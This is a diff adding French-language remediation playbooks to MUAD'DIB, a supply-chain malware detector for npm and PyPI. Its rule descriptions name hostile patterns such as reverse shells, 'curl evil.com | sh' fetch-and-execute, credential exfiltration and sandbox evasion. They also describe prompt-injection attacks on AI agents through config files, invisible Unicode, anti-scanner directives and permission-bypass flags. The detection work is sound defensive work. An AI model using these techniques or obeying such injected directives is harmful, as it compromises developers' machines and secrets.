@@ -1,3 +1,22 @@
+/*
+ * MUAD'DIB — Supply-chain threat detection for npm & PyPI
+ * Copyright (C) 2026 DNSZLSK
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Affero General Public License version 3,
+ * as published by the Free Software Foundation.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU Affero General Public License for more details.
+ *
+ * You should have received a copy of the GNU Affero General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ *
+ * SPDX-License-Identifier: AGPL-3.0-only
+ */
+
 const PLAYBOOKS = {
   lifecycle_script: 
     'Verifier le contenu du script. Desactiver avec "npm config set ignore-scripts true" si suspect.',
@@ -56,8 +75,50 @@ const PLAYBOOKS = {
   exec_wget:
     'Execution de wget via child_process. Verifier l\'URL et les donnees.',
   
+  dynamic_require:
+    'require() avec concatenation detecte. Technique d\'obfuscation pour masquer le module charge. Analyser les variables concatenees.',
+
+  dangerous_exec:
+    'CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.',
+
+  staged_payload:
+    'CRITIQUE: Code telecharge depuis le reseau et execute via eval(). Payload distant probable. Isoler et analyser le trafic reseau.',
+
+  network_require:
+    'require(https/http) dans un script lifecycle. Le package telecharge du code lors de l\'installation. Verifier l\'URL de destination.',
+
+  node_inline_exec:
+    'node -e dans un script lifecycle. Code inline execute a l\'installation. Analyser le code inline.',
+
+  dynamic_import:
+    'import() dynamique detecte. Technique d\'evasion pour eviter la detection de require(). Verifier quel module est charge et son usage.',
+
+  env_proxy_intercept:
+    'CRITIQUE: new Proxy(process.env) intercepte tous les acces aux variables d\'environnement. Technique d\'exfiltration silencieuse. Isoler la machine, regenerer tous les secrets.',
+
+  dynamic_require_exec:
+    'CRITIQUE: exec/execSync appele sur un module charge via require() obfusque. Le module child_process est dissimule par concatenation/encodage. Isoler la machine, auditer les commandes executees.',
+
+  sandbox_evasion:
+    'Code detecte la presence d\'un sandbox/container (/.dockerenv, /proc/cgroup). Technique anti-analyse: le malware adapte son comportement selon l\'environnement. Analyser les deux branches (sandbox vs production).',
+
+  detached_process:
+    'spawn/fork avec {detached: true} detecte. Le processus enfant survit a la fin de npm install et execute le payload en arriere-plan. Verifier les processus en cours: ps aux | grep node. Tuer le processus suspect.',
+
+  linux_fingerprint_exec:
+    'execSync/spawn d\'une commande de reconnaissance Linux (id, uname, lsb_release, hostname, whoami). Seule, peut etre du telemetry legit. Combinee avec un envoi reseau, c\'est du fingerprint pour C2 grouping — verifier le contexte (compound recon_exfil_direct_ip si IP literal publique present dans le meme fichier).',
+
+  direct_ip_exfil:
+    'Endpoint C2 hardcode comme IPv4 literal publique (bypass DNS resolution). Verifier le fichier qui contient l\'IP : si combine avec linux_fingerprint_exec ou credential_regex_harvest, c\'est tres probablement un C2 attaquant. Geolocaliser l\'IP, croiser avec threat intel.',
+
+  recon_exfil_direct_ip:
+    'CRITIQUE: Linux system fingerprint (id/uname/lsb_release/hostname/whoami) + exfil vers IPv4 publique literal dans le meme fichier. Pattern targeted C2 grouping (campagne marginfi mai 2026, design-system-coopeuch). Isoler la machine, blocker l\'IP au firewall, capturer trafic sortant pour forensic.',
+
   known_malicious_package:
     'CRITIQUE: Supprimer immediatement. rm -rf node_modules && npm cache clean --force && npm install',
+
+  dependency_ioc_match:
+    'Le package declare une dependance sur un package IOC connu. Verifier si la dependance est reellement installee (npm ls). Collision de noms possible.',
 
   pypi_malicious_package:
     'CRITIQUE: Supprimer immediatement. pip uninstall <package> && pip install -r requirements.txt',
@@ -67,6 +128,9 @@ const PLAYBOOKS = {
 
   lifecycle_script_dependency:
     'Verifier le contenu du script dans le package. Reinstaller avec --ignore-scripts si suspect.',
+
+  dependency_url_suspicious:
+    'Dependance avec URL suspecte. Verifier l\'URL. Les URLs ngrok/localhost/IP privee sont malveillantes. Ne pas installer.',
 
   suspicious_file:
     'Fichier typique de Shai-Hulud. Ne pas executer. Verifier le hash contre les IOCs connus.',
@@ -92,6 +156,30 @@ const PLAYBOOKS = {
   shai_hulud_marker:
     'CRITIQUE: Marqueur Shai-Hulud detecte. Package compromis. Supprimer immediatement et regenerer tous les tokens.',
 
+  ioc_string_match:
+    'CRITIQUE: String IOC YARA-style matched (campagne malware connue). Verifier le fichier signale et le champ campaign. Si match dans node_modules, considerer le package compromis. Source du IOC dans `iocs/string-iocs.yaml`.',
+
+  anti_forensic_xor_autodelete:
+    'CRITIQUE: Pattern complet anti-forensique (XOR + self-delete + decoy write) dans un seul fichier. Style Axios npm 2026-03 / csec autodelete. Considerer le package compromis. Inspecter le fichier signale et regenerer tous les secrets si le code a deja tourne.',
+
+  anti_forensic_partial:
+    'ATTENTION: 2 patterns anti-forensiques sur 3 dans un meme fichier. Soit malware en cours de developpement, soit faux positif sur lib de crypto/build qui combine XOR + ecriture .bak. Inspection manuelle requise.',
+
+  stub_package_external_payload:
+    'CRITIQUE: Package stub avec dep URL externe + lifecycle hook = pattern ltidi chain. Le code malveillant est dans la dep externe, pas le tarball npm. Bloquer le package + resoudre la dep externe pour audit.',
+
+  stub_package_external_dep:
+    'ATTENTION: Package stub avec dep URL externe (sans lifecycle). Lib legitime qui pull un payload via URL devrait re-exporter la dep. Inspecter la dep cible avant install.',
+
+  axios_family:
+    'CRITIQUE: Famille Axios/csec confirmee (IOC + lifecycle + anti-forensic). Bloquer le package, regenerer tous les secrets, isoler les machines qui ont fait `npm install` recemment.',
+
+  stub_with_string_ioc:
+    'CRITIQUE: Package stub + IOC string connu = staging chain-attack confirme. Bloquer le package + sa dep externe. Regenerer secrets si install effectue.',
+
+  staged_remote_loader:
+    'CRITIQUE: Staged remote loader detecte (Function.constructor("require", body) + process shadow). Le payload reel est sur un pastebin externe (jsonkeeper.com ou autre). Pattern campagne chai-* / poxios-chain. Bloquer le package, isoler les machines qui ont fait `npm install`, regenerer credentials. Inspecter l\'URL paste-service decodee depuis la base64.',
+
   known_malicious_hash:
     'CRITIQUE: Fichier malveillant confirme par hash. Supprimer immediatement. Considerer la machine compromise.',
 
@@ -100,6 +188,19 @@ const PLAYBOOKS = {
 
   typosquat_detected:
     'ATTENTION: Ce package a un nom tres similaire a un package populaire. Verifier que c\'est bien le bon package. Si erreur de frappe, corriger immediatement.',
+
+  // RT-C1: dependency boundary-squat (Axios UNC1069 March 2026)
+  dependency_typosquat:
+    'Une dependance declaree ressemble a un package populaire avec un prefixe/suffixe suspect. Verifier le nom exact dans package.json et confirmer avec npm view <package>. Si erreur de frappe, corriger immediatement.',
+  dependency_typosquat_used:
+    'Le code charge cette dep typosquattee via require/import. Si ce n\'est pas intentionnel, supprimer la dep et la reference, puis reinstaller avec --ignore-scripts.',
+  dependency_typosquat_require:
+    'CRITIQUE — pattern Axios UNC1069 detecte: dep typosquattee declaree ET chargee dans le code. Le wrapper apparent est probablement legitime mais sa dep contient le payload. Bloquer l\'install (--ignore-scripts), supprimer la dep, auditer le history de modifications.',
+  // RT-C1-FPR (audit 2026-05)
+  typosquat_lifecycle:
+    'CRITIQUE — pattern boundary-squat avec hook lifecycle: la dep typosquattee sera executee a l\'install. Bloquer l\'install (--ignore-scripts), supprimer la dep, regenerer les secrets exposes, auditer le history.',
+  typosquat_dataflow:
+    'IMPORTANT — dep boundary-squat coexistante avec un flux credentials → reseau dans le code. Verifier si la dep est require()d depuis le fichier d\'exfil. Si oui = CRITICAL (compound dependency_typosquat_require complementaire).',
 
   dangerous_call_function:
     'Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.',
@@ -125,11 +226,59 @@ const PLAYBOOKS = {
   ssh_key_read:
     'Lecture des cles SSH. Regenerer immediatement toutes les cles: ssh-keygen -t ed25519',
 
+  python_reverse_shell:
+    'CRITIQUE: Reverse shell Python detecte. Machine potentiellement compromise. Isoler immediatement.',
+  perl_reverse_shell:
+    'CRITIQUE: Reverse shell Perl detecte. Machine potentiellement compromise. Isoler immediatement.',
+  fifo_reverse_shell:
+    'CRITIQUE: Reverse shell FIFO/named pipe detecte. Machine potentiellement compromise. Isoler immediatement.',
+
+  fifo_nc_reverse_shell:
+    'CRITIQUE: Reverse shell via mkfifo + netcat detecte. Machine potentiellement compromise. Isoler immediatement. Verifier les connexions sortantes actives.',
+
+  base64_decode_exec:
+    'CRITIQUE: Payload encode en base64 pipe vers un shell. Decoder le payload pour analyse: echo "<payload>" | base64 -d. Isoler la machine si deja execute.',
+
+  wget_base64_decode:
+    'Telechargement + decodage base64 detecte. Verifier l\'URL de telechargement et decoder le contenu. Pattern de staging malveillant en deux etapes.',
+
+  curl_ifs_evasion:
+    'CRITIQUE: Evasion IFS detectee — curl$IFS ou curl${IFS} pipe vers shell. Technique d\'evasion pour contourner la detection de "curl|sh". Ne pas installer.',
+
+  eval_curl_subshell:
+    'CRITIQUE: eval $(curl ...) detecte. Telecharge et execute du code distant via command substitution. Ne pas installer.',
+
+  sh_c_curl_exec:
+    'sh -c wrapping autour de curl detecte. Technique d\'evasion pour masquer l\'execution de commandes distantes. Analyser le contenu telecharge.',
+
+  python_time_delay_exec:
+    'ELEVE: Execution Python avec delai time.sleep() important detectee. ' +
+    'Technique d\'evasion sandbox (T1497.003) : le malware attend l\'expiration du timeout sandbox avant d\'executer le payload. ' +
+    'Verifier le code Python execute et les connexions reseau post-delai.',
+
   shai_hulud_backdoor:
     'CRITIQUE: Backdoor Shai-Hulud dans GitHub Actions. Supprimer le workflow et auditer les runs precedents.',
 
   workflow_injection:
     'Injection potentielle dans GitHub Actions via input non sanitise sur self-hosted runner. Supprimer ou corriger le workflow.',
+
+  workflow_pwn_request:
+    'CRITIQUE: Pwn request detecte — pull_request_target avec checkout du head de la PR permet l\'execution de code arbitraire. Remplacer par pull_request ou utiliser une strategie de checkout securisee (base ref uniquement).',
+
+  workflow_secrets_dump:
+    'CRITIQUE: Workflow GitHub Actions utilise toJSON(secrets) pour dumper tous les secrets du repository. ' +
+    'Technique Shai-Hulud (TeamPCP). Supprimer le workflow immediatement. ' +
+    'Si le workflow a ete execute, considerer tous les secrets du repository compromis et les regenerer.',
+
+  unpinned_action:
+    'INFO: Action GitHub tierce epinglee a une ref mutable (tag/branche) au lieu d\'un commit SHA. ' +
+    'Epingler au SHA complet du commit (ex: uses: owner/repo@<40-hex-sha>) pour empecher qu\'une release retaggee ' +
+    'injecte du code malveillant (cf. tj-actions/changed-files CVE-2025-30066).',
+
+  unpinned_action_in_risky_workflow:
+    'CRITIQUE: Action tierce non-epinglee combinee a un workflow controlable par un attaquant (injection ou pwn-request). ' +
+    'Vecteur de livraison supply-chain (pattern tj-actions/Ultralytics). Epingler toutes les actions au SHA, ' +
+    'supprimer le trigger risque (pull_request_target / contexte attaquant), et auditer l\'historique d\'execution du workflow.',
 
   sandbox_sensitive_file_read:
     'CRITIQUE: Package lit des fichiers sensibles (credentials) lors de l\'installation. Ne pas installer. Supprimer immediatement.',
@@ -147,6 +296,940 @@ const PLAYBOOKS = {
     'Package lance des processus inconnus lors de l\'installation. Verifier les commandes executees.',
   sandbox_timeout:
     'CRITIQUE: Le container sandbox a depasse le timeout. Possible boucle infinie ou consommation de ressources.',
+
+  sandbox_timer_delay_suspicious:
+    'Timer avec delai > 1h detecte. Possible time-bomb: le malware attend avant de s\'activer pour eviter les sandbox. ' +
+    'Verifier le code pour des setTimeout/setInterval avec des delais inhabituels.',
+
+  sandbox_timer_delay_critical:
+    'CRITIQUE: Timer avec delai > 24h detecte. Fort indicateur de time-bomb malware. ' +
+    'Le package retarde volontairement l\'execution du payload pour echapper a l\'analyse sandbox. ' +
+    'NE PAS installer. Analyser le code pour identifier le payload retarde.',
+
+  sandbox_preload_sensitive_read:
+    'Lecture de fichiers sensibles detectee via monkey-patching runtime (.npmrc, .ssh, .aws, .env). ' +
+    'Le package accede a des credentials pendant l\'installation. Regenerer les secrets exposes.',
+
+  sandbox_network_after_sensitive_read:
+    'CRITIQUE: Activite reseau detectee apres lecture de fichiers sensibles. ' +
+    'Fort indicateur d\'exfiltration de credentials. Isoler la machine, supprimer le package, ' +
+    'regenerer TOUS les secrets. Auditer les connexions reseau recentes.',
+
+  sandbox_exec_suspicious:
+    'Execution de commandes dangereuses detectee via monkey-patching runtime (curl, wget, bash, sh, powershell). ' +
+    'Verifier les commandes executees. Si le package n\'a pas de raison legitime d\'executer ces commandes, supprimer.',
+
+  sandbox_env_token_access:
+    'Acces a des variables d\'environnement sensibles detecte via monkey-patching runtime (TOKEN, SECRET, KEY, PASSWORD). ' +
+    'Verifier si le package a une raison legitime d\'acceder a ces variables. Revoquer les credentials si necessaire.',
+
+  sandbox_network_outlier:
+    'Package contacte un domaine/IP hors allowlist pendant l\'installation. Seulement 0.027% des packages font du DNS hors infrastructure npm. ' +
+    'Verifier le domaine contacte. Si aucune raison legitime (CDN de binaires, service declare en dep), considerer comme suspect.',
+
+  sandbox_known_exfil_domain:
+    'CRITIQUE: Package contacte un domaine d\'exfiltration/C2 connu (OAST, webhook.site, infrastructure de campagne). ' +
+    'Taux de faux positif quasi-nul. Actions: 1. NE PAS installer. 2. Signaler au registry. ' +
+    '3. Si deja installe, isoler la machine et regenerer TOUS les secrets.',
+
+  high_entropy_string:
+    'Chaine a haute entropie detectee. Verifier si c\'est du base64, hex, ou un payload chiffre. Analyser le contexte d\'utilisation.',
+  js_obfuscation_pattern:
+    'Pattern d\'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.',
+
+  lifecycle_added_critical:
+    'CRITIQUE: Un script d\'installation (preinstall/install/postinstall) a ete ajoute dans la derniere version. ' +
+    'C\'est le vecteur d\'attaque #1 des supply chain attacks (Shai-Hulud, ua-parser-js, coa). ' +
+    'Actions: 1. NE PAS installer cette version. ' +
+    '2. Verifier le changelog officiel du package. ' +
+    '3. Comparer avec la version precedente: npm diff package@old package@new. ' +
+    '4. Si pas de justification legitime, signaler sur GitHub/npm.',
+
+  lifecycle_added_high:
+    'Un script lifecycle (prepare, prepack, etc.) a ete ajoute dans la derniere version. ' +
+    'Verifier le changelog officiel. Comparer: npm diff package@old package@new. ' +
+    'Si pas de justification, investiguer le mainteneur.',
+
+  lifecycle_modified:
+    'Un script lifecycle a ete modifie entre les deux dernieres versions. ' +
+    'Verifier le contenu du nouveau script. Comparer: npm diff package@old package@new.',
+
+  dangerous_api_added_critical:
+    'CRITIQUE: Une API dangereuse (child_process, eval, Function, net.connect) est apparue dans la derniere version. ' +
+    'Cette API etait absente de la version precedente. ' +
+    'Actions: 1. NE PAS mettre a jour. ' +
+    '2. Comparer les sources: npm diff package@old package@new. ' +
+    '3. Verifier le changelog et les commits recents. ' +
+    '4. Si pas de justification, signaler sur GitHub/npm.',
+
+  dangerous_api_added_high:
+    'Une API suspecte (process.env, fetch, http/https) est apparue dans la derniere version. ' +
+    'Verifier si le changement est justifie dans le changelog. ' +
+    'Comparer: npm diff package@old package@new.',
+
+  dangerous_api_added_medium:
+    'Une API potentiellement suspecte (dns.lookup, fs.readFile sur chemin sensible) est apparue. ' +
+    'Verifier le contexte d\'utilisation. Comparer: npm diff package@old package@new.',
+
+  publish_burst:
+    'Multiple versions published rapidly. Possible account compromise. ' +
+    'Verify maintainer activity on npm/GitHub. Check changelogs for each version.',
+
+  dormant_spike:
+    'Package dormant for 6+ months suddenly updated. ' +
+    'Check if maintainer changed or account was compromised. ' +
+    'Compare: npm diff package@old package@new.',
+
+  rapid_succession:
+    'Versions published in rapid succession. ' +
+    'Could indicate automated attack or compromised CI/CD. ' +
+    'Verify each version for malicious changes.',
+
+  new_maintainer:
+    'A new maintainer was added. Verify this is legitimate by checking the package\'s GitHub/npm page. ' +
+    'Compare: npm diff package@old package@new.',
+
+  suspicious_maintainer:
+    'Maintainer has suspicious name pattern (generic/auto-generated). High risk of account takeover. ' +
+    'Verify maintainer identity on npm and GitHub. Do NOT install until verified.',
+
+  sole_maintainer_change:
+    'The sole maintainer has changed. This is a strong indicator of account compromise (event-stream pattern). ' +
+    'Verify on npm and GitHub. Compare: npm diff package@old package@new.',
+
+  new_publisher:
+    'New publisher detected. Package published by a different user than before. Verify legitimacy by checking the package\'s npm page and changelog.',
+
+  credential_command_exec:
+    'CRITIQUE: Le code utilise un outil CLI legitime (gh, gcloud, aws, az) pour voler des tokens. ' +
+    'Verifier: gh auth status, gcloud auth list, aws sts get-caller-identity. ' +
+    'Regenerer tous les tokens des outils concernes. Revoquer les sessions actives.',
+
+  workflow_write:
+    'Le code cree un fichier dans .github/workflows/ — injection de workflow GitHub Actions. ' +
+    'Supprimer le fichier cree. Auditer les workflows existants. ' +
+    'Verifier les GitHub Actions runs recents pour des executions non autorisees.',
+
+  binary_dropper:
+    'CRITIQUE: Pattern dropper detecte — fichier telecharge, rendu executable (chmod), et execute. ' +
+    'Verifier /tmp pour des binaires suspects. Tuer les processus inconnus. ' +
+    'Considerer la machine compromise si le binaire a ete execute.',
+
+  prototype_hook:
+    'Prototype de fonction native modifie (fetch, XMLHttpRequest, http.request). ' +
+    'Technique d\'interception de trafic pour voler des donnees en transit. ' +
+    'Supprimer le package. Auditer le trafic reseau recent.',
+
+  ai_config_injection:
+    'Fichier de config d\'agent IA contient des instructions malveillantes. ' +
+    'NE PAS ouvrir le projet avec un agent IA sans verifier les fichiers .cursorrules, CLAUDE.md, copilot-instructions.md. ' +
+    'Supprimer ou nettoyer ces fichiers avant toute utilisation. Technique ToxicSkills/Clinejection.',
+
+  ai_config_injection_critical:
+    'CRITIQUE: Fichier de config d\'agent IA contient des commandes d\'exfiltration ou un combo shell + credential access. ' +
+    'NE PAS ouvrir ce projet avec un agent IA. Supprimer les fichiers de config compromis. ' +
+    'Si deja ouvert avec un agent IA, considerer la machine compromise. Regenerer tous les secrets.',
+
+  ide_hook_autoexec:
+    'CRITIQUE: Fichier de configuration IDE avec hooks d\'auto-execution detecte. ' +
+    'NE PAS ouvrir ce projet dans un IDE ou agent IA. Le fichier execute du code ' +
+    'automatiquement a l\'ouverture du projet (SessionStart, folderOpen). ' +
+    'Technique Shai-Hulud (TeamPCP). Supprimer les fichiers .claude/settings.json ' +
+    'et .vscode/tasks.json avant ouverture.',
+
+  aiconf_unicode_obfuscation:
+    'CRITIQUE: Fichier de config d\'agent IA contient des caracteres Unicode invisibles ' +
+    '(zero-width, directional override, variation selectors). Technique TrapDoor (mai 2026): ' +
+    'l\'attaquant insere des U+200B au milieu de mots-cles pour echapper a la revue humaine ' +
+    'et aux regex statiques, tandis que l\'agent IA (Claude, Cursor) lit le contenu normalise ' +
+    'et execute le payload cache. NE PAS ouvrir ce projet avec un agent IA. Ouvrir le fichier ' +
+    'dans un editeur qui affiche les caracteres invisibles (VS Code: "editor.renderControlCharacters") ' +
+    'pour inspecter le contenu reel. Supprimer le fichier ou nettoyer les caracteres invisibles ' +
+    'avant toute utilisation. Si deja ouvert avec un agent IA, regenerer tous les secrets touches.',
+
+  antiscanner_analyzer_directive:
+    'Injection anti-scanner detectee dans le code source : des instructions en langage naturel visent un analyseur LLM. ' +
+    'Forte presomption de malveillance (le paquet tente d\'aveugler les scanners IA). Ignorer toute auto-classification ; ' +
+    'analyser manuellement le fichier signale, en priorite le code a proximite immediate de la directive.',
+
+  antiscanner_verdict_coercion:
+    'Le code tente de forcer un verdict favorable aupres d\'un analyseur LLM. Ignorer toute auto-evaluation du paquet. ' +
+    'Inspecter le fichier manuellement ; traiter comme suspect jusqu\'a preuve du contraire.',
+
+  antiscanner_analysis_suppression:
+    'Le code demande a un analyseur de ne pas inspecter le code voisin — c\'est generalement la que se cache la charge utile. ' +
+    'Deobfusquer et auditer le bloc designe (base64/eval/vm). Ne pas executer le paquet.',
+
+  antiscanner_injection_with_payload:
+    'CRITIQUE : injection anti-scanner + charge obfusquee dans le meme fichier (forme Hades). Isoler le paquet, ne pas l\'executer ' +
+    'ni l\'installer, deobfusquer la charge (base64/eval/vm) et analyser le trafic reseau sortant. Si deja installe, ' +
+    'considerer l\'environnement compromis et regenerer les secrets.',
+
+  import_time_exec:
+    'CRITIQUE: Le fichier Python (__init__.py / setup.py / module top-level) execute exec() ou eval() ' +
+    'a l\'import ou pip install. RCE immediat sur la machine de l\'utilisateur. ' +
+    'NE PAS installer ce package. Si deja installe: pip uninstall immediatement, ' +
+    'auditer les processus en cours, regenerer les credentials potentiellement compromis. ' +
+    'Inspecter le code exec/eval pour identifier le payload reel.',
+
+  import_time_subprocess:
+    'CRITIQUE: Le fichier Python spawn un processus externe (subprocess.Popen/run/call/check_output) ' +
+    'a l\'import ou pip install. Generalement utilise pour fetch + execute remote payload, ' +
+    'lateral movement, ou installation de persistence. NE PAS installer. Verifier le contenu ' +
+    'de l\'appel pour identifier la commande executee. Auditer les processus enfants si deja installe.',
+
+  import_time_os_system:
+    'CRITIQUE: Le fichier Python execute des commandes shell (os.system / os.popen / os.spawn / os.exec) ' +
+    'a l\'import ou pip install. Pattern frequent: "curl evil.com | sh" ou "wget evil.com | bash". ' +
+    'NE PAS installer. Inspecter la commande exacte. Si execute: considerer la machine compromise.',
+
+  import_time_fetch_exec:
+    'CRITIQUE: Pattern TrapDoor detecte. Le fichier Python fetch un payload depuis le reseau ' +
+    '(urllib/requests/http.client/httpx/aiohttp) ET execute du code (exec/eval) dans le meme fichier. ' +
+    'C\'est la signature directe d\'une remote-payload-then-RCE. NE PAS installer. ' +
+    'Bloquer le domaine du fetch dans le firewall. Si execute: incident response complet, ' +
+    'regenerer TOUS les secrets sur la machine (SSH, AWS, GitHub, npm, env vars).',
+
+  import_time_base64_exec:
+    'CRITIQUE: Le fichier Python base64-decode du contenu ET execute (exec/eval) dans le meme fichier. ' +
+    'Pattern d\'obfuscation classique: payload encode pour echapper a la revue + grep statique. ' +
+    'NE PAS installer. Decoder le base64 manuellement pour identifier le payload reel ' +
+    '(python3 -c "import base64; print(base64.b64decode(b\'<payload>\').decode())").',
+
+  import_time_deserialization:
+    'CRITIQUE: Le fichier Python utilise pickle/marshal/dill/cloudpickle .loads() au niveau module. ' +
+    'Ces fonctions sont triviallement RCE si l\'input deserializise vient d\'une source attaquant-controllee ' +
+    '(fichier sur disque, requete HTTP, env var). NE PAS installer si l\'origine du blob deserialize ' +
+    'n\'est pas un fichier de donnees interne au package. Si interne: verifier l\'integrite (signature, hash).',
+
+  dynamic_dangerous_import:
+    'HIGH: Le fichier Python utilise __import__() avec un nom hardcode dangereux ' +
+    '(subprocess, os, requests, urllib, socket, http, ssl, ctypes, importlib). ' +
+    'Pattern d\'obfuscation: evite "import X" statique pour bypass les scanners qui ne tracent ' +
+    'que les imports declares. Combinaison avec exec/subprocess/fetch indique malveillance. ' +
+    'Inspecter manuellement les appels suivants au module dynamiquement importe.',
+
+  python_source_unicode_obfuscation:
+    'CRITIQUE: Fichier Python contient ≥5 caracteres Unicode invisibles ' +
+    '(zero-width, directional override, variation selectors, tag characters). ' +
+    'Python rejette les identifiers avec ZW (PEP 3131 SyntaxError), donc le vecteur est ' +
+    'soit (a) obfuscation dans des strings (GlassWorm-style payload encoding via variation selectors), ' +
+    'soit (b) comments avec ZW pour induire en erreur la revue humaine. ' +
+    'NE PAS installer. Ouvrir le fichier dans un editeur affichant les caracteres invisibles ' +
+    '(VS Code: "editor.renderControlCharacters") pour inspecter le contenu reel.',
+
+  pyast_setup_cmdclass_override:
+    'CRITIQUE: setup.py override une commande install-time via cmdclass={...}. La classe custom va executer ' +
+    'son .run() pendant pip install — RCE direct sur la machine de l\'utilisateur. C\'est le vecteur ' +
+    '#1 des supply chain attacks PyPI (TrapDoor mai 2026, Lazarus, SilentSync). NE PAS installer. ' +
+    'Inspecter la classe override pour identifier le payload (subprocess, urllib, exec, ecriture de fichiers ' +
+    'sensibles). Si deja installe: considerer la machine compromise, regenerer tous les credentials.',
+
+  pyast_setup_entry_points_suspicious:
+    'HIGH: setup.py declare des console_scripts avec des noms suspects (commence par _, post_install, ' +
+    'setup_, install_). Vecteur de persistence ou de hook auto-execute. Inspecter le module:fn cible ' +
+    'pour confirmer la malveillance avant install. Beaucoup de FPs possibles — confidence medium.',
+
+  pyast_module_level_exec:
+    'CRITIQUE: AST confirme exec()/eval() au niveau module (hors function/class). S\'execute systematiquement ' +
+    'a l\'import ou pip install. RCE direct. Plus precis que PYSRC-001 — le scope check garantit que ce ' +
+    'n\'est pas un exec dans une fonction non-appelee. NE PAS installer. Identifier la string passee ' +
+    'a exec/eval pour comprendre le payload.',
+
+  pyast_module_level_subprocess_shell:
+    'CRITIQUE: AST confirme subprocess.Popen/run/call(..., shell=True) au niveau module. shell=True ' +
+    'permet l\'injection de commande shell ; combine a une execution a l\'import, RCE direct. Equivalent ' +
+    'Bandit B602. NE PAS installer. Inspecter la commande passee — generalement "curl|sh" ou ' +
+    '"wget|bash" pour fetch+exec d\'un payload distant.',
+
+  pyast_module_level_unsafe_deserialization:
+    'CRITIQUE: AST confirme pickle/marshal/dill/cloudpickle .loads()/.load() au niveau module. ' +
+    'Ces fonctions sont trivialement RCE si l\'input deserialize vient d\'une source attaquant-controlee ' +
+    '(fichier sur disque, requete HTTP, variable d\'env). CWE-502. Equivalent Bandit B301. NE PAS ' +
+    'installer si la source du blob deserialize est externe ou non-trustee.',
+
+  pyast_dynamic_dangerous_import:
+    'HIGH: AST confirme __import__() avec un nom de module dangereux hardcode (subprocess, os, requests, ' +
+    'urllib, socket, http, ssl, ctypes). Pattern d\'obfuscation classique pour echapper aux scanners ' +
+    'qui ne tracent que les "import X" statiques. Inspecter les appels suivants au module dynamiquement ' +
+    'importe — combine a exec/subprocess/fetch indique malveillance avec haute confiance.',
+
+  pypi_release_zero:
+    'MEDIUM: Package PyPI v0.x.x publie il y a moins de 30 jours. Pattern de lure / ship-as-vulnerable. ' +
+    'Composite-only: cette regle seule ne suffit pas, mais combinee avec PYAST-001 (cmdclass) ou un IOC ' +
+    'string TrapDoor, c\'est un signal fort. Inspecter manuellement: qui est l\'auteur, est-ce que d\'autres ' +
+    'packages aux noms similaires ont ete publies le meme jour, est-ce que le code source ressemble a une ' +
+    'lib utile ou a un stub vide.',
+
+  fork_exec_inline_interpreter:
+    'HIGH: subprocess.X([<interpreter>, -e|-c, ...]) — fork-exec d\'un interpreteur inline ' +
+    '(node -e, python -c, bash -c, ruby -e, perl -e, php -r, ...). Pattern transversal: Python ouvre ' +
+    'un interpreteur d\'un autre langage et lui passe du code dans argv. Signe canonique d\'un staging ' +
+    'multi-langage (TrapDoor mai 2026). NE PAS installer. Inspecter le code passe en argv pour identifier ' +
+    'le payload reel. Si le 3eme element de la liste est une variable, suivre l\'assignment en amont.',
+
+  fetch_to_fork_exec_inline:
+    'CRITIQUE: Pattern TrapDoor exact. Le meme fichier Python fetch un payload reseau ' +
+    '(urllib/requests/httpx/aiohttp) ET le passe a subprocess.X([<interpreter>, -e, ...]) dans le meme ' +
+    'fichier. Le payload distant est execute cote interpreter forked (Node/Bash/Ruby/...) — echappe a ' +
+    'PYAST-005 parce qu\'il n\'y a pas d\'exec/eval Python. NE PAS installer. Bloquer le domaine du fetch ' +
+    'au firewall. Si execute: incident response complet, regenerer tous les secrets — le payload distant ' +
+    'a pu exfiltrer SSH, AWS, GitHub, npm tokens.',
+
+  ai_agent_abuse:
+    'CRITIQUE: Un agent IA (Claude, Gemini, Q) est invoque avec des flags de bypass de securite ' +
+    '(--dangerously-skip-permissions, --yolo, --trust-all-tools). Technique s1ngularity/Nx. ' +
+    'NE PAS installer. Verifier si l\'agent a ete execute. Si oui, considerer la machine compromise. ' +
+    'Auditer les fichiers sensibles (.ssh, .aws, .env) pour des acces non autorises.',
+
+  pyast_fetch_to_exec_taint:
+    'CRITIQUE: Pattern TrapDoor confirme par taint AST. Une variable Python a recu un payload via un fetch reseau ' +
+    '(urllib/requests/httpx/aiohttp/http.client) puis est passee a exec()/eval() au niveau module — RCE direct ' +
+    'a l\'import / pip install. NE PAS installer. Bloquer le domaine du fetch dans le firewall. ' +
+    'Si execute: incident response complet, regenerer TOUS les secrets sur la machine.',
+
+  pyast_base64_to_exec_taint:
+    'CRITIQUE: Pattern d\'obfuscation confirme par taint AST. Une variable Python a recu un payload decodé ' +
+    '(base64/codecs/zlib/gzip/binascii) puis est passee a exec()/eval() au niveau module. NE PAS installer. ' +
+    'Decoder manuellement le payload (python3 -c "import base64; print(base64.b64decode(b\'<blob>\'))") pour ' +
+    'identifier le code masque avant d\'evaluer la portee.',
+
+  pyast_ctypes_shellcode_load:
+    'HIGH: Loader de shellcode native suspect — ctypes.CDLL/WinDLL/LoadLibrary avec (a) un path en zone ' +
+    'world-writable (/tmp, /var/tmp, /dev/shm, ~/, C:\\Windows\\Temp\\) ou (b) un argument taintee venant ' +
+    'd\'un fetch reseau ou d\'un decode. Pattern classique RAT Python (charge un .so/.dll droppe en memoire). ' +
+    'NE PAS installer. Inspecter le path / la variable pour confirmer la provenance du binaire native.',
+
+  pyast_env_to_network_write:
+    'HIGH (ou CRITIQUE si env name match credential pattern): exfiltration de credentials confirmee par taint ' +
+    'AST. Une variable Python a recu une valeur depuis os.environ / os.getenv puis est envoyee dans le body ' +
+    'd\'une requete POST/PUT/PATCH (requests/httpx/urllib.Request). NE PAS installer. Si l\'env var name est ' +
+    'sensible (TOKEN/KEY/SECRET/...), revoke immediatement la credential exposee. Bloquer le domaine du POST.',
+
+  canary_exfiltration:
+    'CRITIQUE: Le package a tente de voler des credentials (honey tokens). Comportement malveillant confirme. ' +
+    'NE PAS installer. Signaler immediatement sur npm/PyPI. ' +
+    'Si deja installe: considerer la machine compromise, regenerer TOUS les secrets.',
+
